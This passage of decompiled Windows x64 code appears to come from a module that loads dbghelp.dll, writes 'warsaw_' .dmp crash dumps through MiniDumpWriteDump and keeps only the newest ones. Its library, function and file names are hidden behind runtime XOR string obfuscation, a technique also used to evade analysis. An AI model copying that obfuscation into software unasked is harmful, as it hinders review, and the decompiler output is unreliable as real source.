  v5 = sub_14002D010(&Srca, (char *)Dest, v4);
  sub_14002E4C0(v1, v5, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v9 >= 8 )
    operator delete(Srca);
  v9 = 7i64;
  v8 = 0i64;
  LOWORD(Srca) = 0;
  if ( v11 >= 8 )
    operator delete(Dst);
  return v1;
}

//----- (000000014002D620) ----------------------------------------------------
_QWORD *__fastcall sub_14002D620(void *Src)
{
  _QWORD *v1; // rdi
  unsigned __int64 v2; // rbx
  _QWORD *v3; // rax
  void *Srca; // [rsp+38h] [rbp-250h]
  unsigned __int64 v6; // [rsp+50h] [rbp-238h]
  WCHAR Buffer; // [rsp+60h] [rbp-228h]
  char Dst; // [rsp+62h] [rbp-226h]

  v1 = Src;
  v2 = 0i64;
  Buffer = 0;
  memset(&Dst, 0, 0x206ui64);
  GetSystemDirectoryW(&Buffer, 0x208u);
  v1[3] = 7i64;
  v1[2] = 0i64;
  *(_WORD *)v1 = 0;
  if ( Buffer )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( *(&Buffer + v2) );
  }
  sub_14002E600(v1, &Buffer, v2);
  sub_14002D170(&Srca, v1);
  if ( v6 >= 8 )
    operator delete(Srca);
  v3 = sub_140075500(&Srca, (_DWORD *(__fastcall *)(void *))sub_14002D740);
  sub_14002E4C0(v1, v3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v6 >= 8 )
    operator delete(Srca);
  return v1;
}

//----- (000000014002D740) ----------------------------------------------------
_QWORD *__fastcall sub_14002D740(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA4F8;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA4F8 & 1 )
  {
    v5 = byte_1400DA4F4;
  }
  else
  {
    v4 = 69069 * dword_1400DA4E8 + 1234567;
    v1 = dword_1400DA4F8 | 1;
    dword_1400DA4E8 = v4;
    dword_1400DA4F8 |= 1u;
    dword_1400DA4E0 = HIWORD(dword_1400DA4E0) + 36969 * (unsigned __int16)dword_1400DA4E0;
    LOBYTE(v4) = (BYTE2(dword_1400DA4F0) + 80 * dword_1400DA4F0) ^ v4;
    dword_1400DA4F0 = HIWORD(dword_1400DA4F0) + 18000 * (unsigned __int16)dword_1400DA4F0;
    v5 = (((unsigned int)dword_1400DA4E4 >> 13) ^ 32 * dword_1400DA4E4 ^ dword_1400DA4E4) + v4;
    dword_1400DA4E4 ^= ((unsigned int)dword_1400DA4E4 >> 13) ^ 32 * (dword_1400DA4E4 ^ (dword_1400DA4E4 << 12));
    byte_1400DA4F4 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA4F8 = v1 | 2;
    byte_1400DA500[0] = v5 ^ 0x64;
    byte_1400DA501 = (v5 - 1) ^ 0x62;
    byte_1400DA502 = (v5 - 2) ^ 0x67;
    byte_1400DA503 = (v5 - 3) ^ 0x68;
    byte_1400DA504 = (v5 - 4) ^ 0x65;
    byte_1400DA505 = (v5 - 5) ^ 0x6C;
    byte_1400DA506 = (v5 - 6) ^ 0x70;
    byte_1400DA507 = (v5 - 7) ^ 0x2E;
    byte_1400DA508 = (v5 - 8) ^ 0x64;
    byte_1400DA509 = (v5 - 9) ^ 0x6C;
    byte_1400DA50A = (v5 - 10) ^ 0x6C;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xBui64 )
  {
    sub_140004790(Src, 0xBui64, 0i64);
    v5 = byte_1400DA4F4;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_WORD *)v6 + 4) = 0;
  *((_BYTE *)v6 + 10) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 11i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 11) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA500[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xB );
  return v3;
}
// 1400DA4E0: using guessed type int dword_1400DA4E0;
// 1400DA4E4: using guessed type int dword_1400DA4E4;
// 1400DA4E8: using guessed type int dword_1400DA4E8;
// 1400DA4F0: using guessed type int dword_1400DA4F0;
// 1400DA4F4: using guessed type char byte_1400DA4F4;
// 1400DA4F8: using guessed type int dword_1400DA4F8;
// 1400DA501: using guessed type char byte_1400DA501;
// 1400DA502: using guessed type char byte_1400DA502;
// 1400DA503: using guessed type char byte_1400DA503;
// 1400DA504: using guessed type char byte_1400DA504;
// 1400DA505: using guessed type char byte_1400DA505;
// 1400DA506: using guessed type char byte_1400DA506;
// 1400DA507: using guessed type char byte_1400DA507;
// 1400DA508: using guessed type char byte_1400DA508;
// 1400DA509: using guessed type char byte_1400DA509;
// 1400DA50A: using guessed type char byte_1400DA50A;

//----- (000000014002D940) ----------------------------------------------------
_DWORD *__fastcall sub_14002D940(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _DWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _DWORD *v6; // rax
  bool v7; // cf
  _DWORD *v8; // rax
  __int64 v9; // rdx
  _DWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA518;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA518 & 1 )
  {
    v5 = byte_1400DA517;
  }
  else
  {
    v4 = 69069 * dword_1400DA4E8 + 1234567;
    v1 = dword_1400DA518 | 1;
    dword_1400DA4E8 = v4;
    dword_1400DA518 |= 1u;
    dword_1400DA4E0 = HIWORD(dword_1400DA4E0) + 36969 * (unsigned __int16)dword_1400DA4E0;
    LOBYTE(v4) = (BYTE2(dword_1400DA4F0) + 80 * dword_1400DA4F0) ^ v4;
    dword_1400DA4F0 = HIWORD(dword_1400DA4F0) + 18000 * (unsigned __int16)dword_1400DA4F0;
    v5 = (((unsigned int)dword_1400DA4E4 >> 13) ^ 32 * dword_1400DA4E4 ^ dword_1400DA4E4) + v4;
    dword_1400DA4E4 ^= ((unsigned int)dword_1400DA4E4 >> 13) ^ 32 * (dword_1400DA4E4 ^ (dword_1400DA4E4 << 12));
    byte_1400DA517 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA518 = v1 | 2;
    byte_1400DA51C[0] = v5 ^ 0x2E;
    byte_1400DA51D = (v5 - 1) ^ 0x64;
    byte_1400DA51E = (v5 - 2) ^ 0x6D;
    byte_1400DA51F = (v5 - 3) ^ 0x70;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 4ui64 )
  {
    sub_140004790(Src, 4ui64, 0i64);
    v5 = byte_1400DA517;
  }
  if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
    v6 = v3;
  else
    v6 = *(_DWORD **)v3;
  *v6 = 0;
  v7 = *((_QWORD *)v3 + 3) < 0x10ui64;
  *((_QWORD *)v3 + 2) = 4i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = *(_DWORD **)v3;
  *((_BYTE *)v8 + 4) = 0;
  v9 = 0i64;
  do
  {
    if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
      v10 = v3;
    else
      v10 = *(_DWORD **)v3;
    v11 = byte_1400DA51C[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 4 );
  return v3;
}
// 1400DA4E0: using guessed type int dword_1400DA4E0;
// 1400DA4E4: using guessed type int dword_1400DA4E4;
// 1400DA4E8: using guessed type int dword_1400DA4E8;
// 1400DA4F0: using guessed type int dword_1400DA4F0;
// 1400DA517: using guessed type char byte_1400DA517;
// 1400DA518: using guessed type int dword_1400DA518;
// 1400DA51D: using guessed type char byte_1400DA51D;
// 1400DA51E: using guessed type char byte_1400DA51E;
// 1400DA51F: using guessed type char byte_1400DA51F;

//----- (000000014002DAE0) ----------------------------------------------------
__int64 *__fastcall sub_14002DAE0(__int64 *a1)
{
  __int64 *v1; // rdi
  size_t v2; // rbx
  char *v3; // rdx
  char *v4; // rax
  char *v5; // r11
  unsigned __int64 v6; // r10
  __int64 v7; // rdx
  __int64 v8; // rcx
  void *v10; // [rsp+48h] [rbp-140h]
  __int64 v11; // [rsp+58h] [rbp-130h]
  unsigned __int64 v12; // [rsp+60h] [rbp-128h]
  char Dst[256]; // [rsp+70h] [rbp-118h]

  v1 = a1;
  v2 = 0i64;
  sub_140075500(a1, (_DWORD *(__fastcall *)(void *))sub_14002DC40);
  memset(Dst, 0, 0x100ui64);
  if ( sub_14000F470(Dst, 255i64) )
  {
    v12 = 15i64;
    v11 = 0i64;
    LOBYTE(v10) = 0;
    if ( Dst[0] )
    {
      v2 = -1i64;
      do
        ++v2;
      while ( Dst[v2] );
    }
    sub_140004F20(&v10, Dst, v2);
    v3 = (char *)&v10;
    if ( v12 >= 0x10 )
      v3 = (char *)v10;
    v4 = &v3[v11];
    v5 = (char *)&v10;
    if ( v12 >= 0x10 )
      v5 = (char *)v10;
    v6 = v1[3];
    if ( v6 < 8 )
      v7 = (__int64)v1;
    else
      v7 = *v1;
    if ( v6 < 8 )
      v8 = (__int64)v1;
    else
      v8 = *v1;
    sub_14002D080(v1, 2 * v1[2] + v8, 2 * v1[2] + v7, v5, v4);
    if ( v12 >= 0x10 )
      operator delete(v10);
  }
  return v1;
}
// 14002DAE0: using guessed type char Dst[256];

//----- (000000014002DC40) ----------------------------------------------------
_QWORD *__fastcall sub_14002DC40(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA50C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA50C & 1 )
  {
    v5 = byte_1400DA50B;
  }
  else
  {
    v4 = 69069 * dword_1400DA4E8 + 1234567;
    v1 = dword_1400DA50C | 1;
    dword_1400DA4E8 = v4;
    dword_1400DA50C |= 1u;
    dword_1400DA4E0 = HIWORD(dword_1400DA4E0) + 36969 * (unsigned __int16)dword_1400DA4E0;
    LOBYTE(v4) = (BYTE2(dword_1400DA4F0) + 80 * dword_1400DA4F0) ^ v4;
    dword_1400DA4F0 = HIWORD(dword_1400DA4F0) + 18000 * (unsigned __int16)dword_1400DA4F0;
    v5 = (((unsigned int)dword_1400DA4E4 >> 13) ^ 32 * dword_1400DA4E4 ^ dword_1400DA4E4) + v4;
    dword_1400DA4E4 ^= ((unsigned int)dword_1400DA4E4 >> 13) ^ 32 * (dword_1400DA4E4 ^ (dword_1400DA4E4 << 12));
    byte_1400DA50B = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA50C = v1 | 2;
    byte_1400DA510[0] = v5 ^ 0x77;
    byte_1400DA511 = (v5 - 1) ^ 0x61;
    byte_1400DA512 = (v5 - 2) ^ 0x72;
    byte_1400DA513 = (v5 - 3) ^ 0x73;
    byte_1400DA514 = (v5 - 4) ^ 0x61;
    byte_1400DA515 = (v5 - 5) ^ 0x77;
    byte_1400DA516 = (v5 - 6) ^ 0x5F;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 7ui64 )
  {
    sub_140004790(Src, 7ui64, 0i64);
    v5 = byte_1400DA50B;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_WORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 6) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 7i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 7) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA510[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 7 );
  return v3;
}
// 1400DA4E0: using guessed type int dword_1400DA4E0;
// 1400DA4E4: using guessed type int dword_1400DA4E4;
// 1400DA4E8: using guessed type int dword_1400DA4E8;
// 1400DA4F0: using guessed type int dword_1400DA4F0;
// 1400DA50B: using guessed type char byte_1400DA50B;
// 1400DA50C: using guessed type int dword_1400DA50C;
// 1400DA511: using guessed type char byte_1400DA511;
// 1400DA512: using guessed type char byte_1400DA512;
// 1400DA513: using guessed type char byte_1400DA513;
// 1400DA514: using guessed type char byte_1400DA514;
// 1400DA515: using guessed type char byte_1400DA515;
// 1400DA516: using guessed type char byte_1400DA516;

//----- (000000014002DE10) ----------------------------------------------------
_QWORD *__fastcall sub_14002DE10(void *Src)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rax
  char *v3; // r8
  char *v4; // r8
  char *v5; // rdx
  __int64 *v6; // rax
  void *v8; // [rsp+38h] [rbp-50h]
  __int64 v9; // [rsp+48h] [rbp-40h]
  unsigned __int64 v10; // [rsp+50h] [rbp-38h]
  void *Srca; // [rsp+58h] [rbp-30h]
  unsigned __int64 v12; // [rsp+70h] [rbp-18h]

  v1 = Src;
  v2 = sub_14007A1A0();
  sub_1400054F0(v2, &v8);
  v3 = (char *)&v8;
  if ( v10 >= 0x10 )
    v3 = (char *)v8;
  v4 = &v3[v9];
  v5 = (char *)&v8;
  if ( v10 >= 0x10 )
    v5 = (char *)v8;
  v1[3] = 7i64;
  v1[2] = 0i64;
  *(_WORD *)v1 = 0;
  sub_1400161F0(v1, v5, v4);
  sub_14002D170(&Srca, v1);
  if ( v12 >= 8 )
    operator delete(Srca);
  v6 = sub_14002DAE0((__int64 *)&Srca);
  sub_14002E4C0(v1, v6, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v12 >= 8 )
    operator delete(Srca);
  if ( v10 >= 0x10 )
    operator delete(v8);
  return v1;
}

//----- (000000014002DF30) ----------------------------------------------------
__int64 __fastcall sub_14002DF30(_QWORD *a1, _OWORD *a2)
{
  _OWORD *v2; // rdi
  __int64 *v3; // rax
  _QWORD *v4; // rax
  const WCHAR *v5; // rcx
  HANDLE v6; // rbx
  _OWORD *v7; // rcx
  struct _WIN32_FIND_DATAW *v8; // rax
  signed __int64 v9; // rdx
  unsigned __int8 v10; // bl
  FILETIME FileTime2; // [rsp+20h] [rbp-D8h]
  __int64 v13; // [rsp+28h] [rbp-D0h]
  LPCWSTR lpFileName; // [rsp+30h] [rbp-C8h]
  __int64 v15; // [rsp+40h] [rbp-B8h]
  unsigned __int64 v16; // [rsp+48h] [rbp-B0h]
  void *v17; // [rsp+50h] [rbp-A8h]
  __int64 v18; // [rsp+60h] [rbp-98h]
  unsigned __int64 v19; // [rsp+68h] [rbp-90h]
  void *Dst; // [rsp+70h] [rbp-88h]
  unsigned __int64 v21; // [rsp+80h] [rbp-78h]
  struct _WIN32_FIND_DATAW FindFileData; // [rsp+88h] [rbp-70h]

  v13 = -2i64;
  v2 = a2;
  FileTime2 = 0i64;
  v16 = 7i64;
  v15 = 0i64;
  LOWORD(lpFileName) = 0;
  sub_140005050(&lpFileName, a1, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  FindFileData.dwFileAttributes = 0;
  memset(&FindFileData.ftCreationTime, 0, 0x24Cui64);
  v3 = sub_140075500(&Dst, sub_14002D940);
  v4 = sub_14002D010(&v17, (char *)&unk_1400A7480, v3);
  sub_14002E4C0(&lpFileName, v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v19 >= 8 )
    operator delete(v17);
  v19 = 7i64;
  v18 = 0i64;
  LOWORD(v17) = 0;
  if ( v21 >= 8 )
    operator delete(Dst);
  v5 = (const WCHAR *)&lpFileName;
  if ( v16 >= 8 )
    v5 = lpFileName;
  v6 = FindFirstFileW(v5, &FindFileData);
  if ( v6 == (HANDLE)-1i64 )
  {
    v10 = 0;
  }
  else
  {
    do
    {
      if ( !(FindFileData.dwFileAttributes & 0x10) && CompareFileTime(&FindFileData.ftLastWriteTime, &FileTime2) == 1 )
      {
        FileTime2 = FindFileData.ftLastWriteTime;
        v7 = v2;
        v8 = &FindFileData;
        v9 = 4i64;
        do
        {
          *v7 = *(_OWORD *)&v8->dwFileAttributes;
          v7[1] = *(_OWORD *)&v8->ftLastAccessTime.dwHighDateTime;
          v7[2] = *(_OWORD *)&v8->nFileSizeLow;
          v7[3] = *(_OWORD *)&v8->cFileName[2];
          v7[4] = *(_OWORD *)&v8->cFileName[10];
          v7[5] = *(_OWORD *)&v8->cFileName[18];
          v7[6] = *(_OWORD *)&v8->cFileName[26];
          v7 += 8;
          *(v7 - 1) = *(_OWORD *)&v8->cFileName[34];
          v8 = (struct _WIN32_FIND_DATAW *)((char *)v8 + 128);
          --v9;
        }
        while ( v9 );
        *v7 = *(_OWORD *)&v8->dwFileAttributes;
        v7[1] = *(_OWORD *)&v8->ftLastAccessTime.dwHighDateTime;
        v7[2] = *(_OWORD *)&v8->nFileSizeLow;
        v7[3] = *(_OWORD *)&v8->cFileName[2];
        v7[4] = *(_OWORD *)&v8->cFileName[10];
      }
    }
    while ( FindNextFileW(v6, &FindFileData) );
    FindClose(v6);
    v10 = 1;
  }
  if ( v16 >= 8 )
    operator delete((void *)lpFileName);
  return v10;
}

//----- (000000014002E160) ----------------------------------------------------
_QWORD *__fastcall sub_14002E160(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA524;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA524 & 1 )
  {
    v5 = byte_1400DA520;
  }
  else
  {
    v4 = 69069 * dword_1400DA4E8 + 1234567;
    v1 = dword_1400DA524 | 1;
    dword_1400DA4E8 = v4;
    dword_1400DA524 |= 1u;
    dword_1400DA4E0 = HIWORD(dword_1400DA4E0) + 36969 * (unsigned __int16)dword_1400DA4E0;
    LOBYTE(v4) = (BYTE2(dword_1400DA4F0) + 80 * dword_1400DA4F0) ^ v4;
    dword_1400DA4F0 = HIWORD(dword_1400DA4F0) + 18000 * (unsigned __int16)dword_1400DA4F0;
    v5 = (((unsigned int)dword_1400DA4E4 >> 13) ^ 32 * dword_1400DA4E4 ^ dword_1400DA4E4) + v4;
    dword_1400DA4E4 ^= ((unsigned int)dword_1400DA4E4 >> 13) ^ 32 * (dword_1400DA4E4 ^ (dword_1400DA4E4 << 12));
    byte_1400DA520 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA524 = v1 | 2;
    byte_1400DA528[0] = v5 ^ 0x4D;
    byte_1400DA529 = (v5 - 1) ^ 0x69;
    byte_1400DA52A = (v5 - 2) ^ 0x6E;
    byte_1400DA52B = (v5 - 3) ^ 0x69;
    byte_1400DA52C = (v5 - 4) ^ 0x44;
    byte_1400DA52D = (v5 - 5) ^ 0x75;
    byte_1400DA52E = (v5 - 6) ^ 0x6D;
    byte_1400DA52F = (v5 - 7) ^ 0x70;
    byte_1400DA530 = (v5 - 8) ^ 0x57;
    byte_1400DA531 = (v5 - 9) ^ 0x72;
    byte_1400DA532 = (v5 - 10) ^ 0x69;
    byte_1400DA533 = (v5 - 11) ^ 0x74;
    byte_1400DA534 = (v5 - 12) ^ 0x65;
    byte_1400DA535 = (v5 - 13) ^ 0x44;
    byte_1400DA536 = (v5 - 14) ^ 0x75;
    byte_1400DA537 = (v5 - 15) ^ 0x6D;
    byte_1400DA538 = (v5 - 16) ^ 0x70;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x11ui64 )
  {
    sub_140004790(Src, 0x11ui64, 0i64);
    v5 = byte_1400DA520;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  *((_BYTE *)v6 + 16) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 17i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 17) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA528[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x11 );
  return v3;
}
// 1400DA4E0: using guessed type int dword_1400DA4E0;
// 1400DA4E4: using guessed type int dword_1400DA4E4;
// 1400DA4E8: using guessed type int dword_1400DA4E8;
// 1400DA4F0: using guessed type int dword_1400DA4F0;
// 1400DA520: using guessed type char byte_1400DA520;
// 1400DA524: using guessed type int dword_1400DA524;
// 1400DA529: using guessed type char byte_1400DA529;
// 1400DA52A: using guessed type char byte_1400DA52A;
// 1400DA52B: using guessed type char byte_1400DA52B;
// 1400DA52C: using guessed type char byte_1400DA52C;
// 1400DA52D: using guessed type char byte_1400DA52D;
// 1400DA52E: using guessed type char byte_1400DA52E;
// 1400DA52F: using guessed type char byte_1400DA52F;
// 1400DA530: using guessed type char byte_1400DA530;
// 1400DA531: using guessed type char byte_1400DA531;
// 1400DA532: using guessed type char byte_1400DA532;
// 1400DA533: using guessed type char byte_1400DA533;
// 1400DA534: using guessed type char byte_1400DA534;
// 1400DA535: using guessed type char byte_1400DA535;
// 1400DA536: using guessed type char byte_1400DA536;
// 1400DA537: using guessed type char byte_1400DA537;
// 1400DA538: using guessed type char byte_1400DA538;

//----- (000000014002E3B0) ----------------------------------------------------
signed __int64 __fastcall sub_14002E3B0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  unsigned int v2; // eax
  bool v3; // cf
  signed __int64 result; // rax
  int v5; // [rsp+20h] [rbp-268h]
  char Dst; // [rsp+24h] [rbp-264h]
  char v7; // [rsp+4Ch] [rbp-23Ch]

  v1 = a1;
  v5 = 0;
  memset(&Dst, 0, 0x24Cui64);
  if ( !(unsigned __int8)sub_14002DF30(v1, &v5) || (v2 = sub_14002D400(&v7), v3 = v2 < 0xA, result = v2 + 1, !v3) )
    result = 1i64;
  return result;
}

//----- (000000014002E430) ----------------------------------------------------
__int64 __fastcall sub_14002E430(__int64 a1)
{
  sub_14002D1F0(a1, 80i64);
  return 0i64;
}
// 14002D1F0: using guessed type __int64 __fastcall sub_14002D1F0(_QWORD, _QWORD);

//----- (000000014002E450) ----------------------------------------------------
__int64 __fastcall sub_14002E450(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // rbx
  _QWORD *v3; // rdi
  __int64 result; // rax

  v2 = a2;
  v3 = a1;
  if ( a2[3] >= 8ui64 )
  {
    if ( a1 )
      *a1 = *a2;
    *a2 = 0i64;
  }
  else if ( a2[2] != -1i64 )
  {
    memmove(a1, a2, 2 * (a2[2] + 1i64));
  }
  v3[2] = v2[2];
  result = v2[3];
  v3[3] = result;
  v2[2] = 0i64;
  v2[3] = 7i64;
  *(_WORD *)v2 = 0;
  return result;
}

//----- (000000014002E4C0) ----------------------------------------------------
_QWORD *__fastcall sub_14002E4C0(void *Src, _QWORD *a2, unsigned __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rax
  unsigned __int64 v5; // rsi
  unsigned __int64 v6; // rbp
  _QWORD *v7; // r14
  _QWORD *v8; // rbx
  unsigned __int64 v9; // rax
  __int64 v10; // r8
  unsigned __int64 v11; // rdi
  unsigned __int64 v12; // rcx
  _QWORD *v13; // rcx
  bool v14; // cf
  _QWORD *v15; // rcx

  v4 = a2[2];
  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = Src;
  if ( v4 < a3 )
  {
    std::_Xout_of_range("invalid string position");
    __debugbreak();
  }
  v9 = v4 - a3;
  v10 = *((_QWORD *)Src + 2);
  if ( v9 < a4 )
    v5 = v9;
  if ( -1 - v10 <= v5 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  if ( v5 )
  {
    v11 = v10 + v5;
    if ( v10 + v5 > 0x7FFFFFFFFFFFFFFEi64 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    v12 = *((_QWORD *)Src + 3);
    if ( v12 >= v11 )
    {
      if ( !v11 )
      {
        v8[2] = 0i64;
        if ( v12 < 8 )
          *(_WORD *)v8 = 0;
        else
          *(_WORD *)*v8 = 0;
        return v8;
      }
    }
    else
    {
      sub_1400048A0(v8, v11, v10);
      if ( !v11 )
        return v8;
    }
    if ( v7[3] >= 8ui64 )
      v7 = (_QWORD *)*v7;
    if ( v8[3] < 8ui64 )
      v13 = v8;
    else
      v13 = (_QWORD *)*v8;
    if ( v5 )
      memcpy((char *)v13 + 2 * v8[2], (char *)v7 + 2 * v6, 2 * v5);
    v14 = v8[3] < 8ui64;
    v8[2] = v11;
    if ( v14 )
      v15 = v8;
    else
      v15 = (_QWORD *)*v8;
    *((_WORD *)v15 + v11) = 0;
  }
  return v8;
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014002E600) ----------------------------------------------------
__int64 *__fastcall sub_14002E600(void *Src, void *a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rdi
  _BYTE *v4; // rsi
  __int64 *v5; // rbx
  unsigned __int64 v6; // rdx
  _BYTE *v7; // rax
  _WORD *v8; // rax
  unsigned __int64 v10; // rcx
  void *v11; // rcx
  bool v12; // cf
  __int64 v13; // rcx

  v3 = a3;
  v4 = a2;
  v5 = (__int64 *)Src;
  if ( a2 )
  {
    v6 = *((_QWORD *)Src + 3);
    v7 = v6 < 8 ? Src : *(_QWORD *)Src;
    if ( v4 >= v7 )
    {
      if ( v6 >= 8 )
        Src = *(void **)Src;
      if ( (char *)Src + 2 * v5[2] > v4 )
      {
        if ( v6 < 8 )
          v8 = v5;
        else
          v8 = (_WORD *)*v5;
        return sub_140005050(v5, v5, (v4 - (_BYTE *)v8) >> 1, a3);
      }
    }
  }
  if ( a3 > 0x7FFFFFFFFFFFFFFEi64 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v10 = v5[3];
  if ( v10 >= a3 )
  {
    if ( !a3 )
    {
      v5[2] = 0i64;
      if ( v10 < 8 )
        *(_WORD *)v5 = 0;
      else
        *(_WORD *)*v5 = 0;
      return v5;
    }
  }
  else
  {
    sub_1400048A0(v5, v3, v5[2]);
  }
  if ( v3 )
  {
    if ( (unsigned __int64)v5[3] < 8 )
      v11 = v5;
    else
      v11 = (void *)*v5;
    if ( v3 )
      memcpy(v11, v4, 2 * v3);
    v12 = (unsigned __int64)v5[3] < 8;
    v5[2] = v3;
    if ( v12 )
      v13 = (__int64)v5;
    else
      v13 = *v5;
    *(_WORD *)(v13 + 2 * v3) = 0;
  }
  return v5;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014002E750) ----------------------------------------------------
__int64 *__fastcall sub_14002E750(__int64 *a1, unsigned __int64 a2, __int64 *a3, unsigned __int64 a4, unsigned __int64 a5)
{
  __int64 *v5; // rbx
  unsigned __int64 v6; // rcx
  unsigned __int64 v7; // r14
  __int64 *v8; // rsi
  unsigned __int64 v9; // r15
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // rdi
  unsigned __int64 v13; // rbp
  unsigned __int64 v14; // rax
  __int64 v15; // rdx
  __int64 v16; // rcx
  unsigned __int64 v17; // rax
  __int64 v18; // rcx
  __int64 v19; // rax
  __int64 v20; // rax
  bool v21; // cf
  __int64 v22; // rax

  v5 = a1;
  v6 = a1[2];
  v7 = a4;
  v8 = a3;
  v9 = a2;
  if ( v6 < a2 || (v10 = a3[2], v10 < a4) )
  {
    std::_Xout_of_range("invalid string position");
    JUMPOUT(*(_QWORD *)&algn_14002E8CF);
  }
  v11 = v10 - a4;
  v12 = a5;
  if ( v11 < a5 )
    v12 = v11;
  if ( -1i64 - v6 <= v12 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  if ( v12 )
  {
    v13 = v6 + v12;
    if ( sub_140004A90(v5, v6 + v12, 0) )
    {
      v14 = v5[3];
      if ( v14 < 8 )
        v15 = (__int64)v5;
      else
        v15 = *v5;
      if ( v14 < 8 )
        v16 = (__int64)v5;
      else
        v16 = *v5;
      if ( v5[2] != v9 )
        memmove((void *)(v16 + 2 * (v9 + v12)), (const void *)(v15 + 2 * v9), 2 * (v5[2] - v9));
      if ( v5 == v8 )
      {
        if ( v9 < v7 )
          v7 += v12;
        v17 = v5[3];
        if ( v17 < 8 )
          v18 = (__int64)v5;
        else
          v18 = *v5;
        if ( v17 < 8 )
          v19 = (__int64)v5;
        else
          v19 = *v5;
        if ( v12 )
          memmove((void *)(v19 + 2 * v9), (const void *)(v18 + 2 * v7), 2 * v12);
      }
      else
      {
